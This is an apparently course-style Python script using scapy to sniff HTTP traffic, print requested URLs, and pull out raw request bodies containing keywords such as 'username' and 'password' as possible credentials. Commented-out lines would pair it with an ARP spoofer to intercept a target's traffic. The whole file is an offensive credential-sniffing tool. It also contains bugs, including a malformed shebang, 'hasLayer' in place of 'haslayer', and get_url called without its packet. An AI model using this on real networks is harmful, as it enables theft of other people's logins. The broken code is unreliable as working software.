#/usr/bin/env python

import optparse, threading
# import lib.arp_spoof as arp_spoof
import lib.packet_sniffer as packet_sniffer
import scapy.all as scapy
from scapy.layers import http

# sys.path.append(os.path.abspath('../arpSpoof'))
# import arp_spoof

def get_arguments():
    parser = optparse.OptionParser()
    # parser.add_option("-g", "--gateway", dest = "gateway", help = "IP gateway")
    # parser.add_option("-t", "--target", dest = "target", help = "IP target")
    parser.add_option("-i", "--interface", dest = "interface", help = "Listening interface")
    (options, arguments) = parser.parse_args()

    return options

def sniff(interface):
    scapy.sniff(iface = interface, store = False, prn = proccess_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.hasLayer(scapy.Raw): 
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
    for keyword in keywords:
        if keyword in load:
            return load    

def proccess_sniffed_packet(packet):
    if packet.hasLayer(http.HTTPRequest):
        url = get_url()
    
        print("[+] HTTP Request >> " + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
        

def main():
    options = get_arguments()

    # target = options.target
    # gateway = options.gateway
    interface = options.interface
    # x = threading.Thread(target=arp_spoof.run, args=(target, gateway,))
    # x.start()
    # arp_spoof.run(target, gateway)
    
    packet_sniffer.sniff(interface)        

main()